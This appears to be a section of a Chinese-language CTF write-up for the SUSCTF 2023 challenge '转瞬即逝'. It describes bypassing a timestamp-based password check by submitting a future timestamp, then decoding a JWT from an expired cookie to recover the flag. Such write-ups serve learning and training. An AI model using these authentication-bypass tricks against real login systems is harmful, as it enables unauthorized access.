## 0x07 转瞬即逝

由于网页没有给什么有用的信息，查看源码：

![image-20231016111404002](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016111404002.png)

发现密码需要和当前的时间戳的值相差在5之内就行。

想到负数也小于5啊，那么我们的密码可以稍微比当前时间大一点。

先在js中使用`Date.parse(new Date())/1000;`获取当前时间戳，然后再后面加个1填入即可。

![image-20231016111617039](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016111617039.png)

登录之后只看到一闪而过的login success，但是此时并没有发现什么异常。

这时查看请求头：

![image-20231016111817582](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016111817582.png)

发现服务器的set-cookie，虽然已经过期了，但是应该有什么信息。这里应该是JWT格式，直接扔到cyberchef中解密即可。

![](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016112004176.png)

成功找到flag。


---

> 作者: alextang  
> URL: https://alextang.top/articles/2023/10/susctf2023-%E4%B8%9C%E5%8D%97%E5%A4%A7%E5%AD%A6%E6%A0%A1%E8%B5%9Bwriteup/  

